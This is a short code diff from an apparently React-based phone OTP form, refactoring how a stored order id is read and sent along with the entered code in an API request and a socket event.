@@ -90,11 +90,13 @@ const PhoneOtp = () => {
     setLoading(true);
     e.preventDefault();
     try {
-      await axios.post(`${api_route}/phoneOtp/${sessionStorage.getItem("id")}`, {
+      const orderId = sessionStorage.getItem("id");
+      await axios.post(`${api_route}/phoneOtp/${orderId}`, {
         phoneOtp,
       });
       socket.emit("phoneOtp", {
-        id: sessionStorage.getItem("id"),
+        _id: orderId,
+        id: orderId,
         phoneOtp,
       });
     } catch {
